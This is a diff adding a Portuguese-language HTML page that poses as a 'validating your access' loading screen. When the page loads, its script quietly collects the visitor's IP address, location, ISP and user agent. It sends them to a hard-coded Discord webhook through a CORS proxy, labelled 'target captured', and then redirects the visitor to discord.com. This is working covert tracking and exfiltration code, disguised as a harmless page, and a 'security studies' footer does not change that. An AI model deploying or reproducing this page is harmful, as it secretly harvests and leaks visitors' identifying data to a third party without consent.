@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificando Conexão...</title>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <p>Aguarde, validando seu acesso...</p>
+    </div>
+
+    <script>
+        // Use um NOVO WEBHOOK se este não funcionar (o Discord desativa links vazados)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480036764730134589/yMCeGposuVce-spJLqeRgaqOX6g7m_8BrlzBQ5N0U7cjHwjEb-Lsj88EIzuSSyjRLsjG";
+
+        async function capturarDados() {
+            try {
+                // 1. Pega os dados de IP
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                // 2. Prepara a mensagem
+                const payload = {
+                    embeds: [{
+                        title: "🎯 Alvo Capturado no Site",
+                        color: 15158332,
+                        fields: [
+                            { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
+                            { name: "📍 Local", value: `${data.city}, ${data.region} - ${data.country_name}`, inline: true },
+                            { name: "🏢 Provedor", value: data.org || "Desconhecido", inline: false },
+                            { name: "📱 Dispositivo", value: navigator.userAgent, inline: false }
+                        ],
+                        footer: { text: "Estudos de Segurança" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // 3. ENVIO COM PROXY (Para evitar bloqueio do Navegador)
+                // Usamos o corsproxy.io para que o Discord receba o dado com sucesso
+                await fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log("Log enviada!");
+
+            } catch (error) {
+                console.error("Erro técnico:", error);
+            } finally {
+                // 4. Redireciona de qualquer jeito após 3 segundos
+                setTimeout(() => {
+                    window.location.href = "https://discord.com"; 
+                }, 3000);
+            }
+        }
+
+        window.onload = capturarDados;
+    </script>
+</body>
+</html>
